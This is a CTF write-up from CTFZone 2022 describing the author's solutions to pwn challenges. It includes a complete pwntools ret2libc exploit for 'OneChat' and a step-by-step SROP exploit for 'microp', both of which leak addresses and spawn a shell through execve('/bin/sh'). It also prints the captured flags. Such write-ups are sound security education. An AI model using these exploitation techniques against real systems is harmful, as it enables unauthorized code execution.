# CTFZone 2022

A 48h CTF Organized by BIZone which took place on August 24–26.

I played as a member of Soteria Team & together, we ranked 22th out of more than 1000 teams.

For this CTF, I've played pwn challenges & they were pretty tough. I've searched & learnt new stuff when dealing with these challenges therefore I really enjoyed this one. I've managed to solve 3 challeges & made progress in the fourth challenge (`stringi`) but I didn't manage to solve it. My favorite challenge for this CTF was [microp](#pwn3 "Writeup"), feel free to check the writeup for more details! I'll be explaining that challenge in more details.

------------

- [Pwn](#pwn)
    -  [Python Bytecode Challenge - Welcome & Part 1](#pwn1 "Writeup")
	-  [OneChat](#pwn2 "Writeup")
    -  [microp](#pwn3 "Writeup")

------------

### Pwn
1. <p name="pwn1"><b>Python Bytecode Challenge - Welcome & Part 1</b> - Medium</p>

For this one, we were given a cli that took care of testing & submitting the solutions. This challenge consist of a set of challenges:

```
Tasks list without names:
- t0-series - 2 tasks - Welcome & guide
- t1-series - 6 tasks - 1 flag - easy-medium
- t2-series - 4 tasks - 1 flag - easy-medium
- t3-series - 3 tasks - 1 flag - medium-hard
- t4-series - 3 tasks - 1 flag - medium
- t5-series - 2 tasks - 1 flag - medium-hard
```

You may check out the cli [here](/2022/CTFZone%202022/source/bc_challenge/) & make sure to check the [guide](/2022/CTFZone%202022/source/bc_challenge/guide). I solved only the `t1-series` challenges therefore the rest of the tasks will be missing from there. The next task was automatically downloaded after solving a task.

The `t0-series` are a tutorial to how to use the cli & get friendly with the environment.

This challenge required a knowledge of Python OpCodes. We were asked to write a function with certain limits, such as opcodes used, the number of opcodes & constantss... And we had to retrieve a secret which could be found in a module or in a variable...

Tasks: [Link](/2022/CTFZone%202022/source/bc_challenge/bc_challenge/tasks/)<br>
Solutions: [Link](/2022/CTFZone%202022/source/bc_challenge/bc_challenge/solutions/)

For this challenge, [Python Documentation](https://docs.python.org/3.9/library/dis.html#python-bytecode-instructions) was good enough to figure out what opcodes to use/remove.

<br>

2. <p name="pwn2"><b>OneChat</b> - Easy</p>

For this one, we had a usual **ret2libc** exploitation, feel free to check the challenge files [here](/2022/CTFZone%202022/source/OneChat/). A binary that reads a `message` & a `name` from the user, both vulnerable to buffer overflow due to the use of `gets` function. Both of them are overflowing in the `add_message` stackframe however, the `message` is copied into the `main` stackframe via an argument passed to the function. Since I used `message` to exploit this **BOF** this caused the payload to overlap with itself, resulting in a part of the payload unuseable which I avoided using a series of pop gadget. To avoid any more problems I decided to stack pivot.

Solver ([Link](/2022/CTFZone%202022/source/OneChat/solve.py))

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./chat_patched")
libc = ELF('./libc.so.6')

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("onechat.ctfz.one", 1337)

    return r


def main():
    r = conn()
    
    pop_rdi = 0x00000000004017bb
    add_rsp = 0x0000000000401012
    ret = 0x0000000000401016
    puts = 0x0000000000401050
    pop_3 = 0x00000000004017b6
    writeable = 0x00000000404000 + 0xa00
    leave_ret = 0x00000000004012e3
    
    r.sendline(b'2')
    
    payload = b"A" * 24
    # This is the end of the first rop chain
    payload += p64(pop_rdi) + p64(writeable)
    payload += p64(exe.symbols.gets)
    payload += p64(leave_ret) # Pivot to get a much cleaner payload
    
    assert len(payload) < 136, "Payload len"
    payload += b"a" * (136 - len(payload) - 8)
    
    # first ROP Chain starts here
    payload += p64(writeable) # RBP
    payload += p64(pop_3) # avoid stack values that got edited
    payload += p64(0x9090909090909090)
    payload += p64(0x9090909090909090) # padding
    payload += p64(pop_rdi)
    payload += p64(exe.got.puts)
    payload += p64(exe.plt.puts) # Leak libc
    
    pause()
    
    r.sendline(payload) # Stage one
    r.sendline(b'm'*6)
    
    pause()
    
    payload = b"/bin/sh\0"
    payload += p64(pop_rdi) + p64(exe.got.puts)
    payload += p64(puts)
    payload += p64(pop_rdi) + p64(writeable+8*7)
    payload += p64(exe.symbols.gets)
    
    r.sendline(payload) # Stage two
    
    r.recvuntil(b'u want to add?\n> ')
    leak = u64(r.readline().strip().ljust(8, b'\0'))
    
    print('leak:', hex(leak))
    
    libc_base = leak - libc.symbols.puts
    pop_rdx_rbx = 0x00000000000884a9 + libc_base
    pop_rsi = 0x000000000002b151 + libc_base
    execve = libc_base + libc.symbols.execve
    
    print("libc base:", hex(libc_base))
    
    pause()
    
    payload = p64(pop_rdi) + p64(writeable)
    payload += p64(pop_rdx_rbx) + p64(0) * 2
    payload += p64(pop_rsi) + p64(0)
    payload += p64(execve)
    
    r.sendline(payload) # Stage three
    
    r.interactive()


if __name__ == "__main__":
    main()
```

Flag: `CTFZone{n0_m0n3y_n0_h0n3y_n0_us3rs_n0_pr0b13ms}`

<br>

2. <p name="pwn3"><b>microp</b> - Medium</p>

This one was my favorite challenge. We were given a binary that contains only an `entry` function that invoked a `read` syscall directly to read 0x1000 bytes:

<p align="center">
    <img src="/2022/CTFZone%202022/images/entry.png">
</p>

This is starting to feel bad, checking the ROP gadgets we have:

<p align="center">
    <img src="/2022/CTFZone%202022/images/rop.png">
</p>

And this is everything we have, pretty much less than that since there are some duplicates. 

Now the dynamic part, executing the binary & sending an input, we see a **BOF** & we have control over RIP at offset 64. We can do a ROP chain & pop a shell but... We don't really have anything useful, do we?

For this one, I spent hours searching for ways to manage to execute a useful ROP chain. Looking at what we currently have:

   - A read gadget to an unknown stack address.
   - The read gadget can give us control over RAX register since `read` returns the number of bytes it read.
   - Syscall gadget
   - We can actually control the address `read` will write into via `pop rbp; ret;` gadget but we don't have any leaks of the stack.

This gives us the following gadgets:

```python
ret         = 0x000000000040105a
read        = 0x0000000000401044
syscall     = 0x0000000000401058
pop_rbp     = 0x000000000040105c
```


Examining the binary, we don't have any writeable area except the stack:

<p align="center">
    <img src="/2022/CTFZone%202022/images/mapping.png">
</p>

With the given above, I couldn't figure out a way to write a ROP chain to pop the shell. The main problem was not being able to control the `rdi` register. I tried to use some syscalls that require RDI to be NULL (or can accept it as NULL) such as `execveat`, `openat`. For these, I was able to control the RSI value as a string since it points to our payload but the third argument, RDX register, was messing it up with it's value 0x1000. Next!

After searching for a while, I came across an SROP(SigReturn Oriented Programming) exploitation technique. To summarize it, `sigreturn` is an instruction used by the kernel to switch back to user-space after executing a syscall or when the process is rescheduled into the CPU in order to restore the process context, which includes all of the register values! & what makes it better, the values to be set are saved in stack! Which means, using a [syscall 15](https://shell-storm.org/shellcode/files/linux-4.7-syscalls-x64.html) to call `SigReturn()` we can set all of the registers values at once! To make things better, `pwntools` provides a `SigreturnFrame` function to create our stack frame. Now we can do any syscall we want:

```python
frame = SigreturnFrame()
frame.rax = SYSSCALL_NUM
frame.rdi = ARG1
frame.rsi = ARG2
frame.rdx = ARG3
frame.rip = syscall

payload = b"A"*64
payload += p64(read)    # Setup RAX register to be 15.
payload += p64(syscall) # Sigret
payload += bytes(frame) # Our fake frame
```

Now, that's a progress but, when actually trying to make use of it, I faced a problem: I had no leak. Considering that `sigreturn` will set the value of all the registers, I'll have to provide RSP register as well else it'll be set to NULL, which means we'll lose control of RIP. To be able to use this, we'll need to get a leak without it.

Now came the second part of the search, how do I get a leak with this? RDI is set to 0 & there is no way to change it without using `sigreturn`... We can set RAX to 1 & call `write(0, rsi, 0x1000)` but we'll be writing to **stdin**. After a while, I remembered that I came across a writeup before that used stdin for leaking values. At first I tried that & used `pwntools` function `readline` to get the leak which didn't work...

Reading more about this, I found a writeup about this & I noticed that they were using `recvall` instead. I tested that **on the remote** & it worked! When I tried it locally, I didn't get anything. That's weird? I ended up reading a bit more about this & I figured it out. When we are connecting to a server remotely, we are using sockets for the communication. If you're familiar with sockets in any programming language, `socket.accept()` returns **one** file descriptor which is used for both **stdin** & **stdout** which means, in our execution remotely, **stdin** == **stdout** ! Now, after figuring this out, we can start off by getting a leak!

```python
payload = b"A"*64
payload += p64(read)        # Set rax=1
payload += p64(syscall)     # Syscall: write(0, rsi, 0x1000)
payload += p64(read)        # This will be used to send stage 2 payload

r.sendline(payload)

pause()

payload2 = b""          # Sendline will add a \n at the end, that's 1 character.
r.sendline(payload2)    # set rax = 1

pause()

# If testing locally, we'll have to provide a leak by ourselves.
# Be careful since a wrong leak can mess up offsets later on.
leak = int(input('Hex:'), 16) if args.LOCAL else  u64(r.recvuntil(b'\x7f')[-6:] + b'\0'*2) - 0x1c59

print('Stack:', hex(leak))
```

Now that we have our leak, we are ready to send our stage 2 payload! Time to SROP! However, to execute `execve("/bin/sh", 0, 0)` we'll need to write "/bin/sh" somewhere in memory first, therefore, we'll call `read` using SROP to be able to control RSI register, we'll use this to write our stage 3 payload too & change RSP to point there.

```python
# Craft our frame
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = leak
frame.rdx = 0x500
frame.rip = syscall
frame.rsp = leak+8      # Skip "/bin/sh\0"
frame.rbp = leak

payload3 = b"A"*88          # Offset to reach RIP.
payload3 += p64(read)       # Read to set RAX register = 15 for sigreturn syscall
payload3 += p64(syscall)    # Sigret to call read for stage 3 & /bin/sh
payload3 += bytes(frame)    # Crafted Frame

r.sendline(payload3)

pause()

payload4 = b'A'*14      # 14 + \n will give us 15.
r.sendline(payload4)    # Set rax = 15
```

And now the final move! We now have "/bin/sh" at the address `leak`. All we have left to do is to SROP to pop our shell:

```python
# Setup our execve("/bin/sh", 0, 0) frame
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = leak
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
frame.rsp = leak+8
frame.rbp = leak+0x500

payload5 = b"/bin/sh\0"
payload5 += p64(read)       # Set RAX=15
payload5 += p64(syscall)    # Sigret to call execve!
payload5 += bytes(frame)    # Our crafted frame

r.sendline(payload5)

pause()

payload6 = b'A'*14      # 14 + \n will give us 15.
r.sendline(payload6)    # Set rax = 15
```

And we pop our shell!<br>
Flag: `ctfzone{519237u2n-0213n73d_p20924mm1n9_15_4_c0mpu732_53cu217y_3xp1017_73chn1qu3_7h47_4110w5_4n_4774ck32_70_3x3cu73_c0d3_1n_p2353nc3_0f_53cu217y_m345u235_5uch_45_n0n-3x3cu74813_m3m02y_4nd_c0d3_519n1n9}` (Holy shit!)

Honestly this challenge was fun to play, I learnt a lot of stuff while searching, more than what I've used here! I'll be looking forward for more challenges & more chances to learn like this one! A huge thanks to the author for this one.

Solver can be found [here](/2022/CTFZone%202022/source/microp/solve.py).<br>
Binary can be found [here](/2022/CTFZone%202022/source/microp/).